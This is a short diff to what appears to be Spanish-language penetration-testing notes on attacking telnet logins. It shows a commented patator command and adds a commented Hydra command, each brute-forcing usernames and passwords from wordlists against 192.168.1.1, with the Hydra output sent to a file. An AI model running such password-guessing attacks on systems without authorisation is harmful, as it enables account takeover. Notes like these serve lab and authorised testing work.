@@ -6,7 +6,9 @@
 
 #patator telnet_login host=192.168.1.1 inputs='FILE0\nFILE1' 0=usuarios.txt 1=contraseñas.txt -t 2 prompt_re='login:|Password:' -x ignore:fgrep='Login incorrect'
 
+#Con Hydra
 
+#sudo hydra -L usuarios.txt -P diccionario.txt   -t 2 -vV 192.168.1.1 telnet | > pass.txt 
 
 
 
